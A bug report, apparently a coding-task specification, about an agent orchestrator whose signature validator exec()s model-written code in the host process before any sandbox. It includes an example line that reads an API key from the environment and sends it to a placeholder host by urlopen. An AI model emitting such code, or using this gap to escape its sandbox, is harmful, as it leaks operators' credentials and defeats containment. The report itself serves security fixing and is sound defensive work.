bug.title: validate_signal_signature exec()s agent-authored source in the host process, so model-written module-level code runs with the orchestrator's credentials and network before any sandbox
bug.symptoms: contract.signal.validate_signal_signature(code) calls _require_signal_module(code), which runs compile(code) and then exec(compiled, module.__dict__) in the calling process. signal_agent.SignalContract.adopt calls it, and signal_agent.LLMSignalAuthor calls adopt on every model answer. Every top-level statement of a model's answer therefore executes in the orchestrator process, with: - its full environment (NULLIUS_*_API_KEY, DATABASE_URL); - its network access; - its filesystem, including the data lake. This happens before any sandbox, import screen or resource limit. A source whose first line is `import os, urllib.request; urllib.request.urlopen("http://x/?k=" + os.environ.get("NULLIUS_ANTHROPIC_API_KEY", ""))` would send the key during adoption. An infinite loop at module level hangs the orchestrator. This defeats design principles 1, 4 and 6 of docs/nullius-tech-architecture.md: agent code lives in the loop-mutated zone Z1, inside a sandbox.
bug.reproduction_steps: Call contract.validate_signal_signature with a source whose module level appends to a list held by the caller (for example, by importing a test helper module and mutating it), or that writes a file under tmp_path. The side effect happens in the calling process.
bug.actual: Root cause: packages/contract/src/contract/signal.py validate_signal_signature obtains the entrypoint by executing the module (_require_signal_module), instead of reading the syntax tree.
bug.constraints: Only the two listed files are edited The signal ABI, the entrypoint name and the problem-string vocabulary are unchanged No network access and no credential in any test Do not edit docs/user-journeys/
